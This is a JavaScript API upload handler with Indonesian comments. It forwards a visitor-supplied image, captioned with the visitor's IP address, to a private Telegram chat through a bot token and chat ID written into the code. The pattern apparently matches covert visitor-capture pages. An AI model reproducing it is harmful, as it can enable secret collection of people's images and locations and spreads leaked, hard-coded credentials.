import FormData from 'form-data';
import fetch from 'node-fetch';
import { Buffer } from 'buffer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  try {
    console.log('Request masuk (api/upload)');

    const body = req.body;
    const dataUrl = body?.image;
    if (!dataUrl) return res.status(400).json({ ok: false, error: 'No image' });

    // ambil IP pengunjung (x-forwarded-for jika ada)
    const xff = req.headers['x-forwarded-for'] || '';
    const clientIp = xff.split(',')[0].trim() || req.socket.remoteAddress || '';

    const matches = dataUrl.match(/^data:(.+);base64,(.+)$/);
    if (!matches) return res.status(400).json({ ok: false, error: 'Invalid dataURL' });

    const mime = matches[1];
    const base64 = matches[2];
    const buffer = Buffer.from(base64, 'base64');

    // -------------------------
    // <-- HARD-CODED CREDENTIALS -->
    // GANTI HATI-HATI / HAPUS LATER jika mau aman
    const BOT_TOKEN = '8599132476:AAFbhY9f4Eo-VvnuhwgJD8erb89bYgMgQyU';
    const CHAT_ID   = '7080925290';
    // -------------------------

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'photo.jpg', contentType: mime });
    form.append('caption', `IP pengunjung: ${clientIp}`);

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      headers: form.getHeaders ? form.getHeaders() : {},
      body: form
    });

    const tgJson = await tgRes.json();
    console.log('Telegram response:', tgJson);

    if (!tgRes.ok) {
      return res.status(502).json({ ok: false, error: 'Telegram error', detail: tgJson });
    }

    return res.status(200).json({ ok: true, telegram: tgJson });
  } catch (err) {
    console.error('upload error', err);
    return res.status(500).json({ ok: false, error: err?.message || String(err) });
  }
}
